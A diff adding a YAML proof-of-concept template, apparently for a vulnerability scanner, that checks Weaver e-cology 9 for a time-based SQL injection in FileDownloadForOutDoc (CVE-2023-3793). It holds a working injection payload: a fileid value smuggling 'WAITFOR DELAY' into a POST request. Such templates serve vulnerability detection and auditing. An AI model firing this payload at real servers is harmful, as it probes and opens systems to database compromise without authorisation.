@@ -1,0 +1,22 @@
+id: poc-yaml-weaver-e-cology-filedownloadforoutdoc-sqli
+info:
+  name: 泛微e-cology9协同办公系统 FileDownloadForOutDoc SQL注入漏洞
+  severity: high
+  tags:
+  - CVE-2023-3793
+  - sql-injection
+  - 两高一弱
+  finger: e-cology
+variables:
+  t1: random_int(5,10)
+requests:
+- method: POST
+  path: /weaver/weaver.file.FileDownloadForOutDoc
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: 'fileid=2+WAITFOR+DELAY+''0:0:{{.t1}}''&isFromOutImg=1
+
+    '
+  expression: status_code == 200 && contains(headers, "ecology_JSessionid=") && duration
+    > t1
+transport: http
